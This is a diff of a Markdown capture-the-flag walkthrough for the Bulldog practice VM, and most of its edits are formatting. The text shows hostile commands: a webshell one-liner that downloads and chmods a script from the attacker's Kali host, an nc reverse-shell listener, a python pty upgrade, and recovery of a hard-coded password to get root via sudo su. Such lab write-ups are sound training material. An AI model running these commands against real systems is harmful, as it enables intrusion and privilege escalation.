@@ -13,12 +13,12 @@
 
 ## Before We Start 
 
-__Make sure you have set up your system according to the instructions in [Part One](FirstCTF_1of2_InfoAndSetup.html)__
+__Make sure you have set up your system according to the instructions in [*Part One!*](FirstCTF_1of2_InfoAndSetup.html)__
 
 
 
 We've set up our VM's, connected them to each other and are ready to boot.<br>
-Let's get into "character"
+Let's get into "character."
 
 *Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team.<br>
 Could this mean there are more vulnerabilities to exploit?<br>
@@ -601,6 +601,7 @@ Again, run this inside `~/bulldog`
 ![A27](https://i.imgur.com/dxMLenc.png)
 <br>
 
+
 Let this run, then go to the browser to run step 3.
 
 #### Shell Step 3 - Downloading the Script
@@ -608,10 +609,10 @@ Let this run, then go to the browser to run step 3.
 The command we run through the webshell will need to download the script from Kali and make it executable.
 
 We will need to break our command down into parts:
-o	`pwd` to trick the if statement
-o	`cd /tmp` to change to a directory where we have permission to download files
-o	`wget  http://KALI_IP:1234/script.sh` to download to that directory
-o	`chmod +x script.sh` to make the script executable
+*	`pwd` to trick the if statement
+*	`cd /tmp` to change to a directory where we have permission to download files
+*	`wget  http://KALI_IP:1234/script.sh` to download to that directory
+*	`chmod +x script.sh` to make the script executable
 
 Run this in the webshell: 
 `pwd && cd /tmp && wget http://KALI_IP:1234/script.sh && chmod +x script.sh`
@@ -620,11 +621,14 @@ Run this in the webshell:
 ![A28](https://i.imgur.com/QktUelE.png)
 <br>
 
+
 When you return to your Kali terminal window, you will see that the file has been accessed by Bulldog's IP.
+
 
 <br>
 ![A29](https://i.imgur.com/Z28B1JU.png)
 <br>
+
 
 ### Shell Step 4 - Stopping the Webserver and Starting the Listener
 
@@ -633,14 +637,15 @@ We need will start up the `nc` listener.
 
 *	`-l` tells `nc` to listen
 *	`-n` tells `nc` to not bother trying to convert IP addresses into hostnames (like bulldog.ctf)
-*  `-v` tells `nc` to be verbose - outputting more information for us to read
-*	-p specifies at what port nc should run. This needs to match the port our shell script uses to connect to Kali.
+* `-v` tells `nc` to be verbose - outputting more information for us to read
+*	`-p` specifies at what port nc should run. This needs to match the port our shell script uses to connect to Kali.
 
 `nc -lnvp 1234`
 
 <br>
 ![A30](https://i.imgur.com/sFk1wOR.png)
 <br>
+
 
 #### Shell Step 5 - Finally Popping the Shell
 
@@ -661,15 +666,15 @@ If it works, the browser window should say "connecting" but not actually load.
 Check your terminal window where you put in the `nc` command. <br>
 It will contain a command shell for `django@bulldog` !
 
-
-![A32](https://i.imgur.com/9ULe19U.png)
-
 <br>
+![A32](https://i.imgur.com/9ULe19U.png)
+<br>
+
 
 ## 5. Enumeration - Looking for Internal Weaknesses
 
-This user shell is primitive, very primitive. <br>
-It does not have tab completion, `CTRL-C` and other bells and whistles our Kali shell has.
+This user shell is primitive. *Very* primitive. <br>
+It does not have tab completion, `CTRL-C` and other bells and whistles our Kali shell has.<br>
 This shell can be upgraded, but we will only be doing that a little bit later on.
 For this box, we can get by with a very primitive shell.
 
@@ -678,8 +683,9 @@ If you stop a process with `CTRL-C` - the shell is stopped instead.<br>
 __If you need to restart your shell, simply repeat steps 4 and 5 of our shell process__
 <br>
 
-This CTF simulates a real-world experience, so we may see some common user missteps.
-In reality, people often leave important notes and reminders simply laying around on their system.<br>
+
+This CTF simulates a real-world experience, so we may see some common user missteps.<br>
+People will often leave important notes and reminders simply laying around on their system.<br>
 These users would leave these things in an email, or maybe their `/home` folder.
 
 
@@ -688,11 +694,12 @@ Let's see what we can see in the `/home` directory.
 
 * `cd /home && ls`
 
-We can see here that our website user, Nick, doesn't have a home folder on this machine.<br>
-This probably means the password we used to log in to the website has no further use to us.<br>
-There are folders for bulldogadmin and django, however.<br>
 
-Our shell, and the `id` command tells us that we ARE django, so we should have full access to this folder.
+We can see here that our website user, Nick, doesn't have a home folder on this machine.<br>
+This probably means the password we used to log in to the website is of no further use to us.<br>
+There are folders for `bulldogadmin` and `django`, however.<br>
+
+Our shell, and the `id` command tells us that we *are* django, so we should have full access to this folder.<br>
 `bulldogadmin` sounds like it would contain some files we might find more interesting than what django has to offer.
 
 
@@ -708,11 +715,12 @@ Might as well check to see if `root_password_do_not_touch.txt` is inside - and i
 Empty? That cant be. Perhaps the files are hidden?
 
 
-* `ls -la /home/bulldogadmin`
+* `ls -a /home/bulldogadmin`
 
 <br>
 ![A34](https://i.imgur.com/x2xqQUh.png)
 <br>
+
 
 All of the files in this directory are hidden! <br>
 Most of them are configuration files found in every user's folder by default, but not `.hiddenadmindirectory` <br> 
@@ -731,18 +739,20 @@ Enter this folder and list its contents - making sure we look for more hidden fi
 ![A35](https://i.imgur.com/3gyKCu9.png)
 <br>
 
+
 A note? Could this be our `AdminPassNoHackersPlz.txt` file?
 
 * `cat note`
 
+![A34.5](https://i.imgur.com/GASrMLM.png)
 
 Very interesting. *"...the webserver is the... ...one who needs to have root access..."* is all I needed to hear to get me interested.
- The other lines that got my attention were *"Once I'm finished with it, a hacker wouldn't even be able to reverse it,"*
- and *"...it's still a prototype right now."*
+The other lines that got my attention were *"Once I'm finished with it, a hacker wouldn't even be able to reverse it,"*
+and *"...it's still a prototype right now."*
 
 Maybe we can reverse engineer this `customPermissionApp` and find something useful.
 
-
+<br>
 
 ## 6. Reversing to Root
 
@@ -756,14 +766,15 @@ As a result, simply trying to read it with `cat` will show  binary characters th
 To get around this, we can use `strings`
 
 `strings` is used to read files, but only outputs friendly, human readable characters to the terminal.
-This file might be pretty long, however, so we should pipe it to the `less` command as well.
+This file might be pretty long, however, so we should pipe it to the `less` command as well.<br>
 Unfortunately, our shell is too primitive at this stage to use `less`
 
-We need what is called a `tty` which allows for more interactivity.
-A reliable way of getting a tty uses python, which we know this webserver has since it is running a Django server. 
+We need what is called a `tty` which allows for more interactivity. <br>
+A reliable way of getting a `tty` uses python, which we know our system is running from way back when we did our `nmap` scans. 
 
 
 * `python -c 'import pty;pty.spawn("/bin/bash")`
+
 
 This may throw out an error, but will still work.
 The error comes from the `/bin/bash` part of our command, and is the same as the error we saw when we started the reverse shell. 
@@ -771,6 +782,7 @@ The error comes from the `/bin/bash` part of our command, and is the same as the
 <br>
 ![A36](https://i.imgur.com/iTMMcUA.png)
 <br>
+
 
 We can now run our `strings` command and pipe it directly into `less`
 
@@ -788,15 +800,17 @@ We have have isolated all the easily read characters, so let's see if anything j
 
 The first thing I noticed was `sudo su root` at the bottom.<br>
 If a user is set up as superuser, and runs this command, the system asks for their password, and then switches the terminal from user shell to a `root` shell. <br>
-Note that the system does not ask for the `root` password to upgrade a shell from user to root, but merely the superuser's password.<br> `sudo su` doesn't run a single command as root, but __logs in__ as root.<br>
+Note that the system does not ask for the `root` password to upgrade a shell from user to root, but merely the superuser's password.<br> `sudo su` doesn't run a single command as root, but __*logs in*__ as root.<br>
 This is exactly what we want to achieve. 
 
 
 We know that `sudo su` requires a password, but look at this line from the application:<br>
 
+
 `Usage: ./customPermissionApp <username>"` 
 
-It doesn't appear to __ask__ for a password, does it?
+
+The application doesn't appear to __ask__ for a password, does it? <br>
 <br>Also, the note mentioned that the application only set up to work for the Django user. <br>
 Could this mean that the password for the Django user is hard-coded into the password itself?
 
@@ -817,18 +831,21 @@ SWORDyouH
 CANTget
 ```
 
-You know, if you dropped those pesky H's at the end, you would find `SUPERultimatePASSWORDyouCANTget`<br>
+You know, if you dropped those pesky H's at the end, you would find<br>
+
+`SUPERultimatePASSWORDyouCANTget`
+
 Could this be our "hidden" password?<br>
 
 Let's try it! 
 
 * `sudo su`
 
-password: SUPERultimatePASSWORDyouCANTget
+* password: SUPERultimatePASSWORDyouCANTget
 
 
 <br>
-![A39 shift+3](https://i.imgur.com/trPzL5x.png)
+![A39 shift+3](https://i.imgur.com/f14sYlH.png)
 <br>
 
 We own this box now - we are the top (bull)dog!<br>
@@ -858,7 +875,7 @@ This mindset is prevalent throughout the pentesting community and will be one of
 
 
 Here are a few pieces of this mindset:
-* "Try harder." (This is the official advice of the OSCP Pentesting Certification)
+* *Try harder* - This is the official advice of the OSCP Pentesting Certification
 * Be self-reliant. CTF writeups are one of the ONLY places you will be spoon fed ideas on how to move forward. If you approach a community of pentesters without showing your own independent efforts, there is an excellent chance you will simply be shown the door.
 * If you don't know something, learn it. Search online, read some books, watch some tutorials and try again. 
 * "How is this intended to be used? How can I do something unexpected?"
